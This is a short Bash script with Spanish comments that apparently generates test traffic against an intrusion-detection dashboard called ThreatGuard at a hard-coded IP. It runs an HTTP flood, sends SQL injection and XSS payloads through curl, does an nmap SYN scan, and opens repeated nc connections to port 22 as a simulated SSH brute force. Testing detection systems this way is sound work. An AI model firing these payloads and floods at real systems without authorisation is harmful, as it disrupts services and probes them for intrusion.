#!/bin/bash
# Script rápido para ejecutar desde Kali Linux
# Genera múltiples alertas de ALTA prioridad

TARGET="98.84.174.81"

echo "==================================================="
echo "GENERANDO ATAQUES CONTRA THREATGUARD"
echo "Target: $TARGET"
echo "==================================================="

# 1. HTTP Flood (ALTA)
echo ""
echo "[1/5] HTTP Flood Attack..."
for i in {1..120}; do
    curl -s http://$TARGET:8080 > /dev/null 2>&1 &
done
wait
echo "    Completado"

# 2. SQL Injection (ALTA)
echo ""
echo "[2/5] SQL Injection Attacks..."
curl -s "http://$TARGET:8080/search?q=admin' UNION SELECT * FROM users--" > /dev/null 2>&1
curl -s "http://$TARGET:8080/login?user=admin' OR 1=1--" > /dev/null 2>&1
curl -s "http://$TARGET:8080/api?id=1' AND 1=1--" > /dev/null 2>&1
echo "    Completado"

# 3. XSS Attacks (ALTA)
echo ""
echo "[3/5] XSS Attacks..."
curl -s "http://$TARGET:8080/comment?text=<script>alert('XSS')</script>" > /dev/null 2>&1
curl -s "http://$TARGET:8080/profile?name=<img src=x onerror='alert(1)'>" > /dev/null 2>&1
curl -s "http://$TARGET:8080/search?q=<script>document.cookie</script>" > /dev/null 2>&1
echo "    Completado"

# 4. Port Scan (MEDIA)
echo ""
echo "[4/5] Port Scan..."
if command -v nmap &> /dev/null; then
    nmap -sS -p 22,80,443,8080 $TARGET > /dev/null 2>&1
    echo "    Completado"
else
    echo "    Saltado (nmap no instalado)"
fi

# 5. SSH Brute Force (ALTA)
echo ""
echo "[5/5] SSH Brute Force Simulation..."
for i in {1..8}; do
    timeout 1 bash -c "echo '' | nc $TARGET 22" > /dev/null 2>&1
    sleep 7
done
echo "    Completado"

echo ""
echo "==================================================="
echo "ATAQUES COMPLETADOS!"
echo ""
echo "Verifica el dashboard en: http://localhost:8080"
echo "(Asegurate de tener el tunel SSH activo)"
echo "==================================================="
